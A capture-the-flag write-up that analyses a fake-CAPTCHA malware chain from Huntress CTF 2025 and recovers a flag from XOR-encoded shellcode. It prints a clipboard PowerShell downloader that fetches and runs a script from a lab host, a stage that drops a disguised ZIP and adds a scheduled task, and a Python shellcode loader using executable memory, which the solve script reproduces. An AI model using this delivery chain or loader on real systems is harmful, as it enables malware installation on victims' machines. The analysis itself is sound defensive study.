---

layout: post
title: "Huntress CTF 2025 - Verify You Are Human"
categories: writeup malware 
permalink: :categories/:title

---

## Challenge Description

> My computer said I needed to update MS Teams, so that is what I have been trying to do...
>
> ...but I can't seem to get past this CAPTCHA!

**Provided:** `10.0.21.131`

## Solution

When accessing the web page, this command is put in our clipboard:

```
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+''+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://10.0.21.131/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

So it is accessing `http://10.0.21.131/?tic=1` and downloading it and saving it as .PS1 (PowerShell script).

After curling that we get a new obfuscated PowerShell script:

```
curl http://10.0.21.131/?tic=1
```

```
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);
$HMGDSHGSHSHS = [guid]::NewGuid();
$OIEOPTRJGS = $env:LocalAppData;
irm 'http://10.0.21.131/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;
Add-Type -AssemblyName System.IO.Compression.FileSystem;
[System.IO.Compression.ZipFile]::ExtractToDirectory(
    "$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", 
    "$OIEOPTRJGS\$HMGDSHGSHSHS"
);
$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;
$WQRGSGSD = "$HMGDSHGSHSHS";
$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";
$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";
$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE \
    -Argument "`"$RYGSDFSGSH`"";
$TDRBRTRNREN = (Get-Date).AddSeconds(180);
$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;
$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" \
    -LogonType Interactive -RunLevel Limited;
Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER \
    -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;
Set-Location $PIEVSDDGs;
$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; 
Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; 
iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + \
    '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');
Remove-Item $MyInvocation.MyCommand.Path -Force;
Set-Clipboard
```


Here the most important thing is now accessing `http://10.0.21.131/?tic=2`. After curling that:

```
curl http://10.0.21.131/?tic=2
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output <FILE>" to save to a file.
```

If we output it to a file and run the `file` command:

file tic2
tic2: Zip archive data, at least v2.0 to extract, compression method=deflate


Zip archive is interesting, let's see what is there when we extract it:

```
inflating: LICENSE.txt
inflating: _asyncio.pyd
inflating: _bz2.pyd
inflating: _ctypes.pyd
inflating: _decimal.pyd
inflating: _elementtree.pyd
inflating: _hashlib.pyd
inflating: _lzma.pyd
inflating: _multiprocessing.pyd
inflating: _overlapped.pyd
inflating: _queue.pyd
inflating: _socket.pyd
inflating: _sqlite3.pyd
inflating: _ssl.pyd
inflating: _uuid.pyd
inflating: _wmi.pyd
inflating: _zoneinfo.pyd
inflating: cpython-3134.pyc
inflating: libcrypto-3.dll
inflating: libffi-8.dll
inflating: libssl-3.dll
inflating: output.py
inflating: pyexpat.pyd
inflating: python.cat
inflating: python.exe
inflating: python3.dll
inflating: python313._pth
inflating: python313.dll
inflating: python313.zip
inflating: pythonw.exe
inflating: select.pyd
inflating: sqlite3.dll
inflating: unicodedata.pyd
inflating: vcruntime140.dll
inflating: winsound.pyd
```

A lot of stuff, but for now I will just look at `output.py`:

```
import base64
#nfenru9en9vnebvnerbneubneubn
exec(base64.b64decode(
    "aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRf"
    "Ynl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVt"
    "ZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlf"
    "bGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVj"
    "cnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdI"
    "Ujl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRFAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVY"
    "NW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1"
    "ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09Jykp"
    "KQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChs"
    "ZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19j"
    "aGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3Zl"
    "TWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5"
    "cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp"
).decode('utf-8'))
#g0emgoemboemoetmboemomeio
```
Let's decode the string we have:

```
echo "aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbD32LlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp" | base64 -d
```

We got a new script:

```
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(
    base64.b64decode(
        'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
        'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
        'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
    ), 
    base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
))

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), 
    ctypes.c_int(len(shellcode)), 
    ctypes.c_int(0x3000), 
    ctypes.c_int(0x40)
)

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)

functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```

This is a shellcode execution script that:

1. **Decrypts** a Base64-encoded payload using XOR decryption
2. **Allocates** executable memory in Windows
3. **Executes** the decrypted shellcode directly

Let's extract the shellcode and save it as `shellcode.bin`:

```
import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

ciphertext = base64.b64decode(
    'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
    'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
    'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
)
key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')

decrypted_shellcode = xor_decrypt(ciphertext, key)

# Save to file for analysis
with open('shellcode.bin', 'wb') as f:
    f.write(decrypted_shellcode)

print(f"Shellcode saved to shellcode.bin ({len(decrypted_shellcode)} bytes)")
```

I will be using radare2 here:

```
r2 -a x86 -b 32 shellcode.bin
```

```
[0x00000000]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: find and analyze function preludes (aap)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00000000]> afl
0x00000000    7    130 fcn.00000000
[0x00000000]> pdf @fcn.00000000
            ;-- oeax:
            ;-- eax:
            ;-- ebx:
            ;-- ecx:
            ;-- edx:
            ;-- esi:
            ;-- edi:
            ;-- eip:
            ;-- eflags:
┌ 130: fcn.00000000 ();
│ afv: vars(3:sp[0x84..0x86])
│           0x00000000      55             push ebp
│           0x00000001      89e5           mov ebp, esp
│           0x00000003      81ec80000000   sub esp, 0x80
│           0x00000009      6893d88484     push 0x8484d893
│           0x0000000e      6890c3c697     push 0x97c6c390
│           0x00000013      68c3909392     push 0x929390c3
│           0x00000018      6890c4c3c7     push 0xc7c3c490
│           0x0000001d      689c939c93     push 0x939c939c
│           0x00000022      68c09cc6c6     push 0xc6c69cc0
│           0x00000027      6897c69c93     push 0x939cc697
│           0x0000002c      6894c79dc1     push 0xc19dc794
│           0x00000031      68dec19691     push 0x9196c1de
│           0x00000036      68c3c9c4c2     push 0xc2c4c9c3
│           0x0000003b      b90a000000     mov ecx, 0xa
│           ; DATA XREF from fcn.00000000 @ 0x73(r)
│           0x00000040      89e7           mov edi, esp
│           ; CODE XREF from fcn.00000000 @ 0x4c(x)
│       ┌─> 0x00000042      8137a5a5a5a5   xor dword [edi], 0xa5a5a5a5 ; [0xa5a5a5a5:4]=-1
│       ╎   0x00000048      83c704         add edi, 4
│       ╎   0x0000004b      49             dec ecx
│       └─< 0x0000004c      75f4           jne 0x42
│           0x0000004e      c644242600     mov byte [var_26h], 0
│           0x00000053      c6857fffff..   mov byte [var_81h], 0
│           0x0000005a      89e6           mov esi, esp
│           0x0000005c      8d7d80         lea edi, [var_80h]
│           0x0000005f      b926000000     mov ecx, 0x26               ; '&'
│           ; CODE XREF from fcn.00000000 @ 0x6b(x)
│       ┌─> 0x00000064      8a06           mov al, byte [esi]
│       ╎   0x00000066      8807           mov byte [edi], al
│       ╎   0x00000068      46             inc esi
│       ╎   0x00000069      47             inc edi
│       ╎   0x0000006a      49             dec ecx
│       └─< 0x0000006b      75f7           jne 0x64
│           0x0000006d      c60700         mov byte [edi], 0
│           0x00000070      8d3c24         lea edi, [esp]
│           0x00000073      b940000000     mov ecx, 0x40               ; '@'
│           0x00000078      b001           mov al, 1
│       ┌─> 0x0000007a      8807           mov byte [edi], al
│       ╎   0x0000007c      47             inc edi
│       ╎   0x0000007d      49             dec ecx
│       └─< 0x0000007e      75fa           jne 0x7a
│           0x00000080      c9             leave
└           0x00000081      c3             ret
```

There are some hex values pushed somewhere and also `0xa5a5a5a5` which I believe is a key that XORs each of those pushed values.

Now I just wrote a script to XOR them:

```
import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

ciphertext = base64.b64decode(
    'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
    'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
    'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
)
key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
decrypted = xor_decrypt(ciphertext, key)

# The pushed values from the disassembly
pushed_values = [
    0x8484d893, 0x97c6c390, 0x929390c3, 0xc7c3c490,
    0x939c939c, 0xc6c69cc0, 0x939cc697, 0xc19dc794,
    0x9196c1de, 0xc2c4c9c3
]

print("Decoding the pushed values with XOR 0xA5A5A5A5:")
decoded_string = b""

for value in pushed_values:
    # XOR with 0xA5A5A5A5
    decoded_value = value ^ 0xA5A5A5A5
    # Convert to bytes (little-endian)
    decoded_bytes = decoded_value.to_bytes(4, 'little')
    decoded_string += decoded_bytes
    print(f"{hex(value)} XOR A5A5A5A5 = {hex(decoded_value)} -> {decoded_bytes}")
````

Output:

```
Decoding the pushed values with XOR 0xA5A5A5A5:
0x8484d893 XOR A5A5A5A5 = 0x21217d36 -> b'6}!!'
0x97c6c390 XOR A5A5A5A5 = 0x32636635 -> b'5fc2'
0x929390c3 XOR A5A5A5A5 = 0x37363566 -> b'f567'
0xc7c3c490 XOR A5A5A5A5 = 0x62666135 -> b'5afb'
0x939c939c XOR A5A5A5A5 = 0x36393639 -> b'9696'
0xc6c69cc0 XOR A5A5A5A5 = 0x63633965 -> b'e9cc'
0x939cc697 XOR A5A5A5A5 = 0x36396332 -> b'2c96'
0xc19dc794 XOR A5A5A5A5 = 0x64386231 -> b'1b8d'
0x9196c1de XOR A5A5A5A5 = 0x3433647b -> b'{d34'
0xc2c4c9c3 XOR A5A5A5A5 = 0x67616c66 -> b'flag'
```

It looks like the flag but in reverse order, so I manually wrote each part and got the flag: `flag{d341b8d2c96e9cc96965afbf5675fc26}`. I believe it's something with endianness.

Also later I wrote this script that automatically solves it and gives the flag:

```
import base64
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    """
    XOR decrypt ciphertext with repeating key
    """
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

def analyze_shellcode():
    """
    Complete analysis of the encrypted shellcode to extract the flag
    """
    # Base64 encoded payload and key from the original script
    ciphertext = base64.b64decode(
        'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
        'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
        'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
    )
    key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')

    # First layer: XOR decrypt the payload
    decrypted_shellcode = xor_decrypt(ciphertext, key)

    print("=== SHELLCODE ANALYSIS ===")
    print(f"Encrypted payload size: {len(ciphertext)} bytes")
    print(f"Key size: {len(key)} bytes")
    print(f"Decrypted shellcode size: {len(decrypted_shellcode)} bytes")

    # Save decrypted shellcode for analysis
    with open('shellcode.bin', 'wb') as f:
        f.write(decrypted_shellcode)

    # The shellcode pushes these values onto the stack (in assembly order)
    pushed_values_assembly_order = [
        0x8484d893, 0x97c6c390, 0x929390c3, 0xc7c3c490,
        0x939c939c, 0xc6c69cc0, 0x939cc697, 0xc19dc794,
        0x9196c1de, 0xc2c4c9c3
    ]

    # Reverse for stack order (last pushed = first in memory)
    pushed_values_stack_order = list(reversed(pushed_values_assembly_order))

    print("\n=== PUSHED VALUES ANALYSIS ===")
    print("Values as pushed in assembly (top to bottom in code):")
    for i, val in enumerate(pushed_values_assembly_order):
        print(f"  push 0x{val:08x}")

    print("\nValues in stack order (bottom to top in memory):")
    for i, val in enumerate(pushed_values_stack_order):
        print(f"  [esp+{i*4:02x}] = 0x{val:08x}")

    # XOR decode each value with 0xA5A5A5A5
    xor_key = 0xA5A5A5A5
    decoded_bytes = b""

    print("\n=== XOR DECODING ===")
    print(f"Using XOR key: 0x{xor_key:08x}")

    for i, val in enumerate(pushed_values_stack_order):
        result = val ^ xor_key
        result_bytes = result.to_bytes(4, 'little')
        decoded_bytes += result_bytes

        print(f"0x{val:08x} XOR 0x{xor_key:08x} = 0x{result:08x} -> {result_bytes} -> '{result_bytes.decode('ascii')}'")

    print(f"\nFull decoded string: {decoded_bytes}")

    # The shellcode copies 0x26 (38) bytes to a buffer
    flag_data = decoded_bytes[:0x26]
    print(f"\n=== FLAG EXTRACTION ===")
    print(f"Shellcode copies 0x26 (38) bytes to buffer")
    print(f"Flag: {flag_data.decode('ascii')}")

    # Clean up the flag (remove null bytes/padding if any)
    clean_flag = flag_data.decode('ascii').split('\x00')[0]
    print(f"Clean flag: {clean_flag}")

    return clean_flag

def execute_shellcode_demo():
    """
    Demonstrate how the original shellcode would execute (Windows only)
    """
    print("\n=== EXECUTION DEMO ===")
    try:
        ciphertext = base64.b64decode(
            'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
            'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
            'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
        )
        key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
        shellcode = xor_decrypt(ciphertext, key)

        print("Allocating executable memory...")
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
            ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
        )

        print("Copying shellcode to memory...")
        buf = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr), 
            buf, 
            ctypes.c_int(len(shellcode))
        )

        print("Creating function pointer...")
        functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
        fn = functype(ptr)

        print("Executing shellcode...")
        fn()

    except Exception as e:
        print(f"Execution failed (expected on Linux): {e}")
        print("This is normal - the shellcode is Windows x86 assembly")

if __name__ == "__main__":
    flag = analyze_shellcode()
```


Running it we get:

```
=== SHELLCODE ANALYSIS ===
Encrypted payload size: 130 bytes
Key size: 22 bytes
Decrypted shellcode size: 130 bytes

=== PUSHED VALUES ANALYSIS ===
Values as pushed in assembly (top to bottom in code):
push 0x8484d893
push 0x97c6c390
push 0x929390c3
push 0xc7c3c490
push 0x939c939c
push 0xc6c69cc0
push 0x939cc697
push 0xc19dc794
push 0x9196c1de
push 0xc2c4c9c3

Values in stack order (bottom to top in memory):
[esp+00] = 0xc2c4c9c3
[esp+04] = 0x9196c1de
[esp+08] = 0xc19dc794
[esp+0c] = 0x939cc697
[esp+10] = 0xc6c69cc0
[esp+14] = 0x939c939c
[esp+18] = 0xc7c3c490
[esp+1c] = 0x929390c3
[esp+20] = 0x97c6c390
[esp+24] = 0x8484d893

=== XOR DECODING ===
Using XOR key: 0xa5a5a5a5
0xc2c4c9c3 XOR 0xa5a5a5a5 = 0x67616c66 -> b'flag' -> 'flag'
0x9196c1de XOR 0xa5a5a5a5 = 0x3433647b -> b'{d34' -> '{d34'
0xc19dc794 XOR 0xa5a5a5a5 = 0x64386231 -> b'1b8d' -> '1b8d'
0x939cc697 XOR 0xa5a5a5a5 = 0x36396332 -> b'2c96' -> '2c96'
0xc6c69cc0 XOR 0xa5a5a5a5 = 0x63633965 -> b'e9cc' -> 'e9cc'
0x939c939c XOR 0xa5a5a5a5 = 0x36393639 -> b'9696' -> '9696'
0xc7c3c490 XOR 0xa5a5a5a5 = 0x62666135 -> b'5afb' -> '5afb'
0x929390c3 XOR 0xa5a5a5a5 = 0x37363566 -> b'f567' -> 'f567'
0x97c6c390 XOR 0xa5a5a5a5 = 0x32636635 -> b'5fc2' -> '5fc2'
0x8484d893 XOR 0xa5a5a5a5 = 0x21217d36 -> b'6}!!' -> '6}!!'

Full decoded string: b'flag{d341b8d2c96e9cc96965afbf5675fc26}!!'

=== FLAG EXTRACTION ===
Shellcode copies 0x26 (38) bytes to buffer
Flag: flag{d341b8d2c96e9cc96965afbf5675fc26}
Clean flag: flag{d341b8d2c96e9cc96965afbf5675fc26}
```

**Flag:** `flag{d341b8d2c96e9cc96965afbf5675fc26}`

## Conclusion

This challenge demonstrates a multi-stage malware delivery system:
1. Initial PowerShell downloader
2. ZIP archive containing Python environment
3. Obfuscated Python script with embedded shellcode
4. XOR-encrypted shellcode containing the flag

The key was to follow the chain of execution and analyze the shellcode to extract the hidden flag. The shellcode used XOR encryption with `0xA5A5A5A5` to hide the flag in memory, and understanding the stack order was crucial for proper decoding.